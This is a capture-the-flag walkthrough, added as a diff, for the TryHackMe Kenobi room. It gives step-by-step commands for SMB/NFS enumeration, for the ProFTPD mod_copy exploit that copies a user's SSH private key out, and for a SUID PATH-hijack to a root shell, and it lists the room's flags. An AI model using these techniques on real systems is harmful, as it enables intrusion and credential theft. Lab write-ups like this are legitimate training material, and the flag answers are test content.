@@ -1,0 +1,256 @@
+================================================================================
+Kenobi CTF - Technical Solution Guide
+https://tryhackme.com/room/kenobi
+================================================================================
+
+OBJECTIVE: Enumerate Samba shares, exploit a vulnerable ProFTPD version, and
+           escalate privileges via PATH variable manipulation
+DIFFICULTY: Easy
+KEYWORDS: Nmap, Samba, SMBClient, NFS, ProFTPD mod_copy, SUID, PATH Hijacking
+TARGET IP: 10.48.134.62
+
+================================================================================
+[1] RECONNAISSANCE
+================================================================================
+
+# Full service scan
+nmap -sV -Pn -T4 10.48.134.62
+
+Starting Nmap 7.99 ( https://nmap.org ) at 2026-04-15 11:35 -0400
+Nmap scan report for 10.48.134.62
+Host is up (0.25s latency).
+Not shown: 993 closed tcp ports (reset)
+
+Open Ports:
+  21/tcp   - ftp         (ProFTPD 1.3.5)
+  22/tcp   - ssh         (OpenSSH 8.2p1 Ubuntu)
+  80/tcp   - http        (Apache httpd 2.4.41)
+  111/tcp  - rpcbind     (2-4, RPC #100000)
+  139/tcp  - netbios-ssn (Samba smbd 4)
+  445/tcp  - netbios-ssn (Samba smbd 4)
+  2049/tcp - nfs         (3-4, RPC #100003)
+
+Answer - Ports open: 7
+
+================================================================================
+[2] ENUMERATING SAMBA FOR SHARES
+================================================================================
+
+# Enumerate SMB shares and users
+enum4linux -a 10.48.134.62
+
+Answer - Shares found: 3
+
+# Connect to the anonymous share
+smbclient //10.48.134.62/anonymous
+Password for [WORKGROUP\root]:
+smb: \> ls
+  .                                   D        0  Wed Sep  4 06:49:09 2019
+  ..                                  D        0  Sat Aug  9 09:03:22 2025
+  log.txt                             N    12237  Wed Sep  4 06:49:09 2019
+
+Answer - File visible on share: log.txt
+
+# Download the file
+smbget -a smb://10.48.134.62/anonymous
+
+Answer - FTP port: 21
+
+# Enumerate NFS mounts via rpcbind
+nmap -p 111 --script=nfs-ls,nfs-statfs,nfs-showmount 10.48.134.62
+
+Results show:
+  /var    (accessible, world-readable mount)
+
+Answer - Visible mount: /var
+
+================================================================================
+[3] GAIN INITIAL ACCESS WITH PROFTPD
+================================================================================
+
+# Confirm ProFTPD version via nmap scan results
+21/tcp open ftp ProFTPD 1.3.5
+
+Answer - ProFTPD version: 1.3.5
+
+# Search for known exploits
+searchsploit proftpd 1.3.5
+
+Results:
+  ProFTPd 1.3.5 - 'mod_copy' Command Execution (Metasploit)   | linux/remote/37262.rb
+  ProFTPd 1.3.5 - 'mod_copy' Remote Command Execution          | linux/remote/36803.py
+  ProFTPd 1.3.5 - 'mod_copy' Remote Command Execution (2)      | linux/remote/49908.py
+  ProFTPd 1.3.5 - File Copy                                    | linux/remote/36742.txt
+
+Answer - Number of exploits: 4
+
+# Use the mod_copy vulnerability (SITE CPFR / SITE CPTO commands)
+# to copy Kenobi's private SSH key into the NFS-accessible /var/tmp directory
+
+nc 10.48.134.62 21
+220 ProFTPD 1.3.5 Server (ProFTPD Default Installation) [10.48.134.62]
+SITE CPFR /home/kenobi/.ssh/id_rsa
+350 File or directory exists, ready for destination name
+SITE CPTO /var/tmp/id_rsa
+250 Copy successful
+
+# Mount the /var NFS share and retrieve the private key
+mkdir /mnt/kenobiNFS
+mount 10.48.134.62:/var /mnt/kenobiNFS
+cp /mnt/kenobiNFS/tmp/id_rsa .
+sudo chmod 600 id_rsa
+
+# SSH into the machine as kenobi
+ssh -i id_rsa kenobi@10.48.134.62
+
+# Retrieve the user flag
+kenobi@kenobi:~$ cat user.txt
+
+Answer - User flag: d0b0f3f53b6caa532a83915e19224899
+
+================================================================================
+[4] PRIVILEGE ESCALATION WITH PATH VARIABLE MANIPULATION
+================================================================================
+
+# Search for SUID binaries
+find / -perm -u=s -type f 2>/dev/null
+
+Notable result:
+  /usr/bin/menu   <-- unusual custom SUID binary
+
+Answer - Unusual SUID binary: /usr/bin/menu
+
+# Run the binary to inspect it
+/usr/bin/menu
+
+***************************************
+1. status check
+2. kernel version
+3. ifconfig
+** Enter your choice :
+
+Answer - Number of options: 3
+
+# Inspect the binary with strings to see what it calls
+strings /usr/bin/menu
+
+Key findings:
+  curl -I localhost    <-- called without full path
+  uname -r             <-- called without full path
+  ifconfig             <-- called without full path
+
+# Because the binary uses relative command names and runs as root (SUID),
+# we can create a malicious 'curl' in /tmp and prepend /tmp to $PATH
+
+kenobi@kenobi:~$ cd /tmp
+kenobi@kenobi:/tmp$ echo /bin/sh > curl
+kenobi@kenobi:/tmp$ chmod 777 curl
+kenobi@kenobi:/tmp$ export PATH=/tmp:$PATH
+kenobi@kenobi:/tmp$ /usr/bin/menu
+
+***************************************
+1. status check
+2. kernel version
+3. ifconfig
+** Enter your choice :1
+# whoami
+root
+
+# Retrieve the root flag
+# cat /root/root.txt
+
+Answer - Root flag: 177b3cd8562289f37382721c28381f02
+
+================================================================================
+[5] FLAGS SUMMARY
+================================================================================
+
+User Flag : d0b0f3f53b6caa532a83915e19224899  -> /home/kenobi/user.txt
+Root Flag : 177b3cd8562289f37382721c28381f02  -> /root/root.txt
+
+================================================================================
+[6] VULNERABILITY ANALYSIS
+================================================================================
+
+CVE          : CVE-2015-3306
+Component    : ProFTPD 1.3.5 mod_copy module
+Risk         : HIGH — Unauthenticated file copy to arbitrary locations
+Disclosure   : 2015-04-01
+
+Description:
+  The mod_copy module in ProFTPD 1.3.5 allows remote attackers to read and
+  write files to arbitrary locations via SITE CPFR and SITE CPTO commands,
+  without requiring authentication. This was chained with an exposed NFS mount
+  to exfiltrate Kenobi's SSH private key.
+
+Contributing factors on this machine:
+  1. ProFTPD 1.3.5 with mod_copy enabled and unauthenticated access
+  2. NFS /var share exposed world-wide (no host restriction)
+  3. Custom SUID binary (/usr/bin/menu) calling commands without full paths
+  4. Predictable file locations (SSH key at default path)
+
+================================================================================
+[7] TOOLS USED
+================================================================================
+
+Reconnaissance:
+- Nmap 7.99          : Port/service scanning, NFS enumeration (nfs-ls, nfs-showmount)
+- enum4linux         : Samba share and user enumeration
+
+Initial Access:
+- smbclient          : SMB share browsing and file download
+- Netcat (nc)        : Manual FTP command injection via mod_copy
+- NFS mount          : Retrieving the copied SSH private key
+
+Privilege Escalation:
+- strings            : Inspecting SUID binary for called commands
+- PATH hijacking     : Replacing 'curl' with a shell in /tmp
+
+================================================================================
+[8] ATTACK CHAIN SUMMARY
+================================================================================
+
+Nmap scan → 7 open ports identified
+    ↓
+enum4linux → 3 SMB shares found, anonymous share accessible
+    ↓
+smbclient → log.txt retrieved (reveals SSH key location & NFS info)
+    ↓
+Nmap NFS scripts → /var mount exposed world-wide
+    ↓
+searchsploit → ProFTPD 1.3.5 mod_copy (4 exploits)
+    ↓
+Netcat → SITE CPFR /home/kenobi/.ssh/id_rsa → SITE CPTO /var/tmp/id_rsa
+    ↓
+NFS mount of /var → SSH private key copied to attacker machine
+    ↓
+SSH login as kenobi → User flag captured (d0b0f3f53b6caa532a83915e19224899)
+    ↓
+find SUID binaries → /usr/bin/menu identified
+    ↓
+strings /usr/bin/menu → curl called without full path
+    ↓
+PATH hijack: echo /bin/sh > /tmp/curl → export PATH=/tmp:$PATH
+    ↓
+/usr/bin/menu (option 1) → root shell spawned
+    ↓
+Root flag captured (177b3cd8562289f37382721c28381f02)
+    ↓
+Complete system compromise
+
+================================================================================
+[9] REFERENCES
+================================================================================
+
+TryHackMe:
+- Kenobi Room: https://tryhackme.com/room/kenobi
+
+CVE:
+- CVE-2015-3306 (ProFTPD mod_copy): https://www.cve.org/CVERecord?id=CVE-2015-3306
+
+Tools:
+- Nmap:       https://nmap.org/
+- enum4linux: https://github.com/CiscoCXSecurity/enum4linux
+- Metasploit: https://www.metasploit.com/
+
+================================================================================
